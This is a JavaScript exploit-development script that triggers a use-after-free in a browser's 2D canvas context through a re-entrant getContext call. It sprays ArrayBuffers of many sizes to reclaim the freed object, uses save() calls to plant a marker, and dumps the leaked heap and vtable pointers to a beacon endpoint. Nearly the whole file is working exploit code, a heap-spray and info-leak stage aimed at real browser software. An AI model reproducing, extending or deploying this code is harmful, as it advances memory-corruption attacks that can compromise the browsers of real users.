// p465-canvas-size-finder.js
// Empirically determine CanvasRenderingContext2D allocation size class
// by spraying ABs of many sizes after UAF, calling save() (safe: inline non-virtual),
// then scanning for the m_unrealizedSaveCount marker.

(function() {
    var RUN = Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/p465-' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : String(body));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // --- Phase 1: Trigger canvas UAF (no same-type spray) ---
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    document.body.appendChild(c);

    var innerCtx = null;
    var outerCtx = c.getContext('2d', {
        get desynchronized() {
            innerCtx = c.getContext('2d');
            return false;
        }
    });

    if (!innerCtx) {
        B('FAIL', 'no-innerCtx');
        return;
    }
    B('P1-UAF', 'ok');

    // --- Phase 2: Spray ABs of many sizes (zero-filled by default) ---
    // Cover bmalloc size classes from 128 to 4096
    var sizes = [];
    var s;
    for (s = 128; s <= 512; s += 16) sizes.push(s);   // 16-byte steps: fine granularity
    for (s = 576; s <= 1024; s += 64) sizes.push(s);   // 64-byte steps
    for (s = 1152; s <= 2048; s += 128) sizes.push(s);  // 128-byte steps
    for (s = 2304; s <= 4096; s += 256) sizes.push(s);  // 256-byte steps

    var PER_SIZE = 200;
    var allABs = {};
    var totalCount = 0;

    for (var si = 0; si < sizes.length; si++) {
        var sz = sizes[si];
        allABs[sz] = [];
        for (var j = 0; j < PER_SIZE; j++) {
            allABs[sz].push(new ArrayBuffer(sz));
        }
        totalCount += PER_SIZE;
    }

    B('P2-SPRAY', { numSizes: sizes.length, perSize: PER_SIZE, total: totalCount });

    // --- Phase 3: Call save() 66 times (0x42) ---
    // save() is inline non-virtual: ++m_unrealizedSaveCount
    // No vtable dispatch, no pointer dereference. Safe on AB-reclaimed memory.
    var MARKER = 66;
    var saveOK = true;
    try {
        for (var i = 0; i < MARKER; i++) {
            innerCtx.save();
        }
    } catch(e) {
        saveOK = false;
        B('P3-ERR', e.message);
    }
    B('P3-SAVE', { count: MARKER, ok: saveOK });

    // --- Phase 4: Scan all ABs for uint32 == MARKER ---
    var hits = [];
    for (si = 0; si < sizes.length; si++) {
        sz = sizes[si];
        var arr = allABs[sz];
        for (j = 0; j < PER_SIZE; j++) {
            var dv = new DataView(arr[j]);
            for (var off = 0; off < sz - 3; off += 4) {
                var v = dv.getUint32(off, true);
                if (v === MARKER) {
                    hits.push({ size: sz, idx: j, offset: off });
                    if (hits.length >= 20) break;
                }
            }
            if (hits.length >= 20) break;
        }
        if (hits.length >= 20) break;
    }

    if (hits.length > 0) {
        B('P4-HIT', { count: hits.length, hits: hits.slice(0, 5) });

        // Dump first 256 bytes of the hit AB as hex (info leak: vtable, heap ptrs)
        var h = hits[0];
        var hitAB = allABs[h.size][h.idx];
        var hitDV = new DataView(hitAB);
        var dumpLen = Math.min(h.size, 256);
        var hexParts = [];
        for (var k = 0; k < dumpLen; k += 8) {
            var lo = hitDV.getUint32(k, true);
            var hi4 = hitDV.getUint32(k + 4, true);
            if (lo !== 0 || hi4 !== 0) {
                hexParts.push(k.toString(16) + ':' + hi4.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
            }
        }
        B('P4-DUMP256', hexParts.join(' '));

        // Also dump bytes around the hit offset (+-32 bytes)
        var nearby = [];
        var startDump = Math.max(0, h.offset - 64);
        var endDump = Math.min(h.size, h.offset + 96);
        for (k = startDump; k < endDump; k += 4) {
            nearby.push(hitDV.getUint32(k, true).toString(16).padStart(8, '0'));
        }
        B('P4-NEARBY', { from: startDump, data: nearby.join(' ') });

        // Full 64-byte-stride dump of entire AB to find all non-zero regions
        var nonZeroRegions = [];
        for (k = 0; k < h.size; k += 8) {
            lo = hitDV.getUint32(k, true);
            hi4 = hitDV.getUint32(k + 4, true);
            if (lo !== 0 || hi4 !== 0) {
                nonZeroRegions.push(k + ':' + hi4.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
            }
        }
        B('P4-ALLNZ', nonZeroRegions.join(' '));

    } else {
        B('P4-MISS', 'no-uint32-66-found');

        // Diagnostic: scan for ANY non-zero uint32 in all ABs
        var nonZeroCounts = {};
        for (si = 0; si < sizes.length; si++) {
            sz = sizes[si];
            var nz = 0;
            arr = allABs[sz];
            for (j = 0; j < PER_SIZE; j++) {
                dv = new DataView(arr[j]);
                for (off = 0; off < sz - 3; off += 4) {
                    if (dv.getUint32(off, true) !== 0) { nz++; break; }
                }
            }
            if (nz > 0) nonZeroCounts[sz] = nz;
        }
        B('P4-DIAG', { nonZeroCounts: nonZeroCounts });
    }

    B('DONE', 'p465-' + RUN);
})();
